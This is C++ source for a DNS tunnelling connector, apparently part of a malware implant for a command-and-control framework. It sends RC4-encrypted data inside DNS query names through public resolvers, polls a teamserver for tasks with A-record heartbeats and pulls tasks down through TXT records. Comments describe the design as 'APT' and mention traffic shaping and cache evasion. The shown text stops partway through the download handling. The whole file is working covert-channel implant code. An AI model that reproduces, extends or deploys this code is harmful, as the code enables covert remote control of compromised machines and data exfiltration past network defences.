#include "ConnectorDNS.h"
#include "DnsUtils.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

// ============================================================================
// Helper: Select resolver from profile (first entry before comma/semicolon)
// ============================================================================

static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
{
	const CHAR* def = "1.1.1.1";
	if (!raw || !raw[0]) {
		_snprintf(out, outSize, "%s", def);
		return;
	}

	size_t i = 0;
	while (raw[i] && i + 1 < outSize) {
		CHAR c = raw[i];
		if (c == ',' || c == ';' || c == ' ' || c == '\t' || c == '\r' || c == '\n')
			break;
		out[i] = c;
		++i;
	}
	out[i] = '\0';
	if (i == 0) {
		_snprintf(out, outSize, "%s", def);
	}
}

static ULONG DnsBuildWireSeq(ULONG logicalSeq, ULONG signalBits)
{
	ULONG seqCounter = logicalSeq & 0x0FFF;
	ULONG sig = signalBits & 0x0F;
	return (sig << 12) | seqCounter;
}

// High 4 bits of seq are used as signalBits. For DNS connector we set a
// constant non-zero marker so the server can distinguish logical DNS vs DoH
// traffic at protocol level.
static const ULONG kDnsSignalBitsDNS = 0x1;

#pragma pack(push, 1)
typedef struct _DNS_META_V1 {
	BYTE  version;
	BYTE  metaFlags;
	USHORT reserved;
	ULONG downAckOffset; // when metaFlags bit0 is set
} DNS_META_V1, *PDNS_META_V1;
#pragma pack(pop)

static void MetaV1Init(DNS_META_V1* h)
{
	if (!h) return;
	h->version      = 1;
	h->metaFlags    = 0;
	h->reserved     = 0;
	h->downAckOffset = 0;
}

// Single-resolver DNS query (no rotation logic, caller handles rotation)
static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
		return FALSE;

	WSADATA wsaData;
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	SOCKET s = ApiWin->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		ApiWin->WSACleanup();
		return FALSE;
	}

	// Use provided resolver IP directly (no parsing needed)
	const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "1.1.1.1";

	HOSTENT* he = ApiWin->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

	BYTE query[4096];
	memset(query, 0, sizeof(query));
	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01; // recursion desired
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01; // QDCOUNT = 1

	int offset = 12;
	int nameLen = DnsEncodeName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	offset += nameLen;
	// QTYPE / QCLASS IN (1)
	USHORT qtypeCode = 16; // TXT
	if (qtypeStr && qtypeStr[0]) {
		CHAR qt[8];
		memset(qt, 0, sizeof(qt));
		int qi = 0;
		while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
			CHAR c = qtypeStr[qi];
			if (c >= 'a' && c <= 'z')
				c = (CHAR)(c - 'a' + 'A');
			qt[qi++] = c;
		}
		qt[qi] = '\0';
		// Only support TXT/A/AAAA here.
		if (qt[0] == 'A' && qt[1] == '\0') {
			qtypeCode = 1; // A
		} else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0') {
			qtypeCode = 28; // AAAA
		}
	}
	query[offset++] = (BYTE)(qtypeCode >> 8);
	query[offset++] = (BYTE)(qtypeCode & 0xFF);
	query[offset++] = 0x00;
	query[offset++] = 0x01;

	BYTE resp[1024];
	memset(resp, 0, sizeof(resp));
	int recvLen = 0;
	// Single attempt per resolver - rotation handles failover, no internal retry needed
	// This speeds up failover detection significantly
	
	// Log readable QNAME (domain format)
	
	int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
	if (sent != offset) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = s;
	timeval timeout;
	timeout.tv_sec = 3;  // 3 second timeout per resolver
	timeout.tv_usec = 0;

	int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
	if (selResult == 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	if (selResult == SOCKET_ERROR) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	int addrLen = sizeof(addr);
	recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
	if (recvLen > 0) {
	}

	ApiWin->closesocket(s);
	ApiWin->WSACleanup();
	if (recvLen <= 0) {
		return FALSE;
	}

	// 解析 answers，根据 qtypeCode 决定如何重组 payload
	if (recvLen < 12) {
		return FALSE;
	}
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;
	// 跳过所有 question
	for (int qi = 0; qi < qdcount; ++qi) {
		// 跳过 name
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) { // 压缩指针
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++; // 终止 0
		pos += 4; // QTYPE+QCLASS
	}

	ULONG written = 0;
	// 解析 answers
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		// name（可能是压缩指针）
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2; // TYPE
		pos += 2; // CLASS
		pos += 4; // TTL
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;

		if (qtypeCode == 16 && type == 16 && rdlen > 0) {
			// TXT RDATA: one or more <len><data> segments; concatenate safely
			USHORT consumed = 0;
			ULONG txtWritten = 0;
			while (consumed < rdlen) {
				if (pos + consumed >= recvLen)
					break;
				BYTE txtLen = resp[pos + consumed];
				consumed++;
				if (consumed + txtLen > rdlen)
					break;
				if (txtLen > 0) {
					if (txtWritten + txtLen <= outBufSize) {
						memcpy(outBuf + txtWritten, resp + pos + consumed, txtLen);
						txtWritten += txtLen;
					} else {
						// output buffer full
						break;
					}
				}
				consumed += txtLen;
			}
			if (txtWritten > 0) {
				*outSize = txtWritten;
				return TRUE;
			}
		} else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
			// A 记录：4 字节 IPv4，服务器端按 4 字节分片 payload
			if (written + 4 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 4);
				written += 4;
			}
		} else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
			// AAAA 记录：16 字节 IPv6，服务器端按 16 字节分片 payload
			if (written + 16 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 16);
				written += 16;
			}
		}
		pos += rdlen;
	}

	if (qtypeCode == 1 || qtypeCode == 28) {
		if (written > 0) {
			*outSize = written;
			return TRUE;
		}
	}

	return FALSE;
}

// DnsBuildDataLabels and Base64Decode are now in DnsUtils.h/cpp

ConnectorDNS::ConnectorDNS()
{
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
{
    // cache profile
    this->profile = profile;

    // Parse resolver list (comma/semicolon separated)
    this->resolverCount = 0;
    ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
    for (ULONG i = 0; i < 16; ++i) {
        this->resolverList[i] = NULL;
        this->resolverFailCount[i] = 0;
        this->resolverDisabledUntil[i] = 0;
    }

    if (profile.resolvers && profile.resolvers[0]) {
        lstrcpynA(this->rawResolvers, (CHAR*)profile.resolvers, sizeof(this->rawResolvers));
        CHAR* p = this->rawResolvers;
        while (*p && this->resolverCount < 16) {
            // Skip leading whitespace and separators
            while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
            if (!*p) break;
            this->resolverList[this->resolverCount++] = p;
            // Find end of this resolver
            while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
            if (*p) *p++ = '\0';
        }
    }

    // Default resolver if none specified
    if (this->resolverCount == 0) {
        lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
        this->resolverList[0] = this->rawResolvers;
        this->resolverCount = 1;
    }

    for (ULONG i = 0; i < this->resolverCount; ++i) {
    }

    // copy encrypt key (fixed 16 bytes binary, NOT null-terminated string)
    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    // encrypt_key is already hex-decoded to 16 bytes binary in pl_agent.go
    // Do NOT use StrLenA - binary data may contain 0x00 bytes
    memcpy(this->encryptKey, profile.encrypt_key, 16);

    // pkt size and basic bounds
    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000)
        this->pktSize = 64000;

    // label size (per DNS label, in Base32 characters)
    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63)
        this->labelSize = 48;

    // domain/qtype
    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    // Force TXT mode internally to support the Hybrid A/TXT protocol.
    // Even if the user configures "A" in the listener profile, we override it here
    // because the new protocol logic relies on TXT for data transport.
    lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    // derive sid from decrypted beat first 8 bytes (agent_type, agent_id)
    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    // beat is already RC4-encrypted with config->encrypt_key on Agent side,
    // so here we decrypt it with the same key to get clear agent_id.
    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    // Interpret agent_id in big-endian order to match the HTTP listener /
    // Go side (which uses binary.BigEndian.Uint32). This ensures that the
    // sid we derive here is identical to the agentId string used by the
    // teamserver, so TsAgentProcessData/TsAgentGetHostedTasks(sid, ...) hit
    // the same agent entry.
    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // cache initial beat for potential smart HI retries
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries  = 3;
            this->hiSent     = FALSE;
        }
    }

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    // Free any allocated receive buffer.
    if (this->recvData) {
        // Using HeapFree / LocalFree would require function pointers
        // similar to other connectors; for this stub we simply ignore
        // allocator details and reset the pointer/state.
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf    = NULL;
        this->downTotal  = 0;
        this->downFilled = 0;
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
	this->profile.resolvers = resolvers;

	// Re-parse resolver list
	this->resolverCount = 0;
	ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
	for (ULONG i = 0; i < 16; ++i) {
		this->resolverList[i] = NULL;
		this->resolverFailCount[i] = 0;
		this->resolverDisabledUntil[i] = 0;
	}

	if (resolvers && resolvers[0]) {
		lstrcpynA(this->rawResolvers, (CHAR*)resolvers, sizeof(this->rawResolvers));
		CHAR* p = this->rawResolvers;
		while (*p && this->resolverCount < 16) {
			while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
			if (!*p) break;
			this->resolverList[this->resolverCount++] = p;
			while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
			if (*p) *p++ = '\0';
		}
	}

	if (this->resolverCount == 0) {
		lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
		this->resolverList[0] = this->rawResolvers;
		this->resolverCount = 1;
	}

}

BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;

	if (this->resolverCount == 0) {
		return FALSE;
	}

	// Try each resolver in rotation order
	for (ULONG i = 0; i < this->resolverCount; ++i) {
		ULONG idx = (this->currentResolverIndex + i) % this->resolverCount;
		CHAR* resolver = this->resolverList[idx];
		if (!resolver || !*resolver) continue;

		// Skip disabled resolvers (failure backoff)
		ULONG nowTick = GetTickCount();
		if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx]) {
			continue;
		}


		if (DnsQuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
			// Success - update current index and reset fail count
			this->currentResolverIndex = idx;
			this->resolverFailCount[idx] = 0;
			this->resolverDisabledUntil[idx] = 0;
			return TRUE;
		}

		// Failure - increment fail count
		this->resolverFailCount[idx]++;

		// After 2 consecutive failures, disable this resolver temporarily
		// Lower threshold since we removed internal retries from DnsQuerySingle
		const ULONG maxFail = 2;
		if (this->resolverFailCount[idx] >= maxFail) {
			ULONG backoff = 30000; // 30 seconds (shorter, allow faster recovery)
			ULONG jitter = GetTickCount() & 0x0FFF; // 0-4095ms jitter
			this->resolverDisabledUntil[idx] = GetTickCount() + backoff + jitter;
			this->resolverFailCount[idx] = 0;
		}
	}

	// All resolvers failed
	return FALSE;
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    // base packet size used for DNS frames
    ULONG pkt = this->pktSize ? this->pktSize : 1024;
    if (pkt > 64000)
        pkt = 64000;

    CHAR dataLabel[1024];
    memset(dataLabel, 0, sizeof(dataLabel));
    CHAR qname[512];
    memset(qname, 0, sizeof(qname));

    // HI：第一次带 beat 的调用仍然沿用原始打包方式
    if (!this->hiSent && data && data_size) {
        // Base32 encoding expands data by ~1.6x. The total DNS QNAME length is limited to 253 bytes.
        // Subtracting domain and prefix overhead, we have about 150-180 chars for data labels.
        // 180 chars Base32 -> ~110 bytes raw data.
        // We set a conservative limit of 60 bytes to leave ample room for the user's domain.
        // 60 bytes raw -> 96 chars Base32.
        // 96 + 31 (prefix) = 127 chars used.
        // 253 - 127 = 126 chars remaining for the Domain. This is very safe.
        const ULONG maxSafeFrame = 60;
        ULONG maxBuf = pkt;
        if (maxBuf > maxSafeFrame)
            maxBuf = maxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;
        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        ULONG hiWireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "www", hiWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        this->lastQueryOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
        if (this->lastQueryOk) {
            this->hiSent = TRUE;
        } else {
            if (this->hiRetries > 0) {
                this->hiRetries--;
            }
        }
        return;
    }

    // 之后所有有数据的调用视为 PUT，使用应用层分片：
    // frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
    if (data && data_size) {
        const ULONG metaSize = sizeof(DNS_META_V1);
        const ULONG headerSize = metaSize + 8; // meta + [total][offset]
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= headerSize)
            maxChunk = headerSize + 1;
        maxChunk -= headerSize;

        // CRITICAL FIX: Enforce 253-byte QNAME limit.
        // 60 bytes raw -> 96 chars Base32.
        // 96 + 50 (domain/overhead) = 146 < 253. Very Safe.
        const ULONG maxSafeFrame = 60;
        if (maxChunk + headerSize > maxSafeFrame)
            maxChunk = maxSafeFrame - headerSize;

        // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
        const ULONG maxUploadSize = 4 << 20; // 4MB
        if (total > maxUploadSize)
            total = maxUploadSize;

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        while (offset < total) {
            ULONG chunk = total - offset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = headerSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            DNS_META_V1 meta;
            MetaV1Init(&meta);
            // If we have a meaningful downAckOffset, encode it into MetaHeader V1
            if (this->downAckOffset > 0) {
                meta.metaFlags |= 0x01; // bit0 = hasDownAckOffset
                meta.downAckOffset = this->downAckOffset;
            }
            memcpy(frame, &meta, metaSize);
            // total_len (big-endian) after MetaHeader
            frame[metaSize + 0] = (BYTE)((total >> 24) & 0xFF);
            frame[metaSize + 1] = (BYTE)((total >> 16) & 0xFF);
            frame[metaSize + 2] = (BYTE)((total >> 8) & 0xFF);
            frame[metaSize + 3] = (BYTE)((total >> 0) & 0xFF);
            // offset (big-endian)
            frame[metaSize + 4] = (BYTE)((offset >> 24) & 0xFF);
            frame[metaSize + 5] = (BYTE)((offset >> 16) & 0xFF);
            frame[metaSize + 6] = (BYTE)((offset >> 8) & 0xFF);
            frame[metaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
            memcpy(frame + headerSize, data + offset, chunk);

            // RC4 encrypt the entire PUT frame before Base32 encoding
            EncryptRC4(frame, frameSize, this->encryptKey, 16);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            ULONG putWireSeq = DnsBuildWireSeq(seqForSend, kDnsSignalBitsDNS);
            DnsBuildQName(this->sid, "cdn", putWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
            BYTE tmp[512];
            ULONG tmpSize = 0;
            
            // PUT with retry: DNS is unreliable, retry up to 3 times on failure
            BOOL putOk = FALSE;
            for (int retry = 0; retry < 3 && !putOk; retry++) {
                if (retry > 0) {
                    ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
                }
                putOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
            }
            
            if (!putOk) {
                return;  // Abort upload, will retry entire upload next time
            }

            // Pacing with Jitter (Traffic Shaping):
            // Range: 30-50ms (~20-30 packets/sec).
            // Public DoH resolvers can handle this rate.
            ULONG pacing = 30 + (GetTickCount() % 20);
            ApiWin->Sleep(pacing);

            offset += chunk;
        }
        // 记录本次上行总量，供自适应 sleep 使用
        this->lastUpTotal = total;
        
        // After PUT, send ACK heartbeat with nonce to confirm task was received
        // After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
        // HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
        if (this->downAckOffset > 0) {
            ULONG ackNonce = GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
            BYTE ackData[12];
            // ackOffset (big-endian)
            ackData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
            ackData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
            ackData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
            ackData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
            // hbNonce (big-endian)
            ackData[4] = (BYTE)((ackNonce >> 24) & 0xFF);
            ackData[5] = (BYTE)((ackNonce >> 16) & 0xFF);
            ackData[6] = (BYTE)((ackNonce >> 8) & 0xFF);
            ackData[7] = (BYTE)((ackNonce >> 0) & 0xFF);
            // ackTaskNonce (big-endian) - to identify which task is being ACKed
            ackData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
            ackData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
            ackData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
            ackData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
            // RC4 encrypt ACK data before Base32 encoding
            EncryptRC4(ackData, 12, this->encryptKey, 16);
            CHAR ackLabel[32]; // Increased for 12 bytes base32 encoded
            memset(ackLabel, 0, sizeof(ackLabel));
            DnsBase32Encode(ackData, 12, ackLabel, sizeof(ackLabel));
            
            CHAR ackQname[256];
            DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
            BYTE tmp[16];
            ULONG tmpSize = 0;
            this->QueryWithRotation(ackQname, "A", tmp, sizeof(tmp), &tmpSize);
            // NOTE: Do NOT reset downAckOffset here! Keep it so subsequent HB requests
            // continue to carry the ACK until server confirms (no_tasks) or new task starts.
        }
        return;
    }

    // 空数据：GET 下行任务；在未完成首 HI 时优先执行智能 HI 重试。
    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
        ULONG maxBuf = pkt;
        // 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
        ULONG retrySize = this->hiBeatSize;
        if (retrySize > maxBuf)
            retrySize = maxBuf;
        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        ULONG hiRetryWireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "www", hiRetryWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
            this->lastQueryOk = TRUE;
        } else {
            this->lastQueryOk = FALSE;
            if (this->hiRetries > 0)
                this->hiRetries--;
        }
        return;
    }

    // 正常 GET / 心跳逻辑
    // Hybrid Mode (A/TXT):
    // 如果当前没有正在重组的下行任务 (downBuf == NULL) 且配置为 TXT 模式，
    // 则先发送一个轻量级的 A 记录查询作为心跳。
    // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
    // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
    // ACK 机制：在心跳 A 查询中携带 downAckOffset 和 downTaskNonce，告知服务器已确认接收的 offset。
    // HB 数据格式: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 字节
    // 只有在没有下载缓冲区、没有待处理任务、且使用 TXT 模式时才发心跳
    // 如果 hasPendingTasks=TRUE，跳过心跳直接进入 GET 逻辑
    if (!this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') { // starts with 'T' -> TXT
        CHAR qnameA[512];
        // APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
        ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
        BYTE hbData[12];
        // ackOffset (big-endian)
        hbData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
        hbData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
        hbData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
        hbData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
        // hbNonce (big-endian) - for cache busting
        hbData[4] = (BYTE)((hbNonce >> 24) & 0xFF);
        hbData[5] = (BYTE)((hbNonce >> 16) & 0xFF);
        hbData[6] = (BYTE)((hbNonce >> 8) & 0xFF);
        hbData[7] = (BYTE)((hbNonce >> 0) & 0xFF);
        // ackTaskNonce (big-endian) - to identify which task is being ACKed
        hbData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
        hbData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
        hbData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
        hbData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
        // RC4 encrypt HB data before Base32 encoding
        EncryptRC4(hbData, 12, this->encryptKey, 16);
        CHAR hbLabel[32]; // Increased size for 12 bytes base32 encoded
        memset(hbLabel, 0, sizeof(hbLabel));
        DnsBase32Encode(hbData, 12, hbLabel, sizeof(hbLabel));
        ULONG hbLogicalSeq = this->seq + 1;
        ULONG hbWireSeq = DnsBuildWireSeq(hbLogicalSeq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
        
        
        BYTE ipBuf[16];
        ULONG ipSize = 0;
        // 查询 A 记录
        if (this->QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
            this->lastQueryOk = TRUE;
            // 检查是否为 0.0.0.0
            if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
                this->seq++;
                // 重置 ACK offset 因为没有待下载的任务
                this->downAckOffset = 0;
                this->hasPendingTasks = FALSE;
                return;
            }
            // 有任务，标记 pending 以触发 burst 模式
            // CRITICAL: 设置 hasPendingTasks 后立即返回，不要在同一个 SendData 中执行 GET
            // 这样 MainAgent 才能在下一轮循环检查 IsBusy() 并进入 burst 模式
            this->hasPendingTasks = TRUE;
            this->seq++; // 更新 seq，因为心跳已完成
            return; // 返回让 MainAgent 检查 IsBusy() 并进入 burst
        } else {
            // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
            this->lastQueryOk = FALSE;
            return;
        }
    }

    // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
    // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
    // APT DESIGN: Include both offset AND nonce in query to prevent ALL DNS caching
    // Nonce makes each query globally unique, offset tells server what data we need
    ULONG reqOffset = this->downFilled;
    ULONG nonce = GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
    
    // Pack: [offset:4][nonce:4] -> RC4 encrypt -> Base32 label
    BYTE reqData[8];
    reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
    reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
    reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
    reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
    reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
    reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
    reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
    reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
    // RC4 encrypt GET query data
    EncryptRC4(reqData, 8, this->encryptKey, 16);
    CHAR reqLabel[24];
    memset(reqLabel, 0, sizeof(reqLabel));
    DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
    
    ULONG logicalSeq = ++this->seq;
    ULONG getWireSeq = DnsBuildWireSeq(logicalSeq, kDnsSignalBitsDNS);
    DnsBuildQName(this->sid, "api", getWireSeq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (this->QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        this->lastQueryOk = TRUE;
        // Check for simple ACK "OK"
        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
            return;
        }

        // Base64 Decode the response (Server sends Base64 to ensure binary safety over TXT)
        BYTE binBuf[1024];
        int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
        if (binLen <= 0) {
            // Server may have restarted and lost task state
            // Abort current download so next heartbeat can re-check for tasks
            if (this->downBuf) {
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
                this->downTotal = 0;
                this->downFilled = 0;
                this->downAckOffset = 0;
            }
            return;
        }

        // RC4 decrypt the response after Base64 decoding
        DecryptRC4(binBuf, binLen, this->encryptKey, 16);

        const ULONG headerSize = 8;
        // 新协议：带有 [total_len][offset] 头部
        if (binLen > headerSize) {
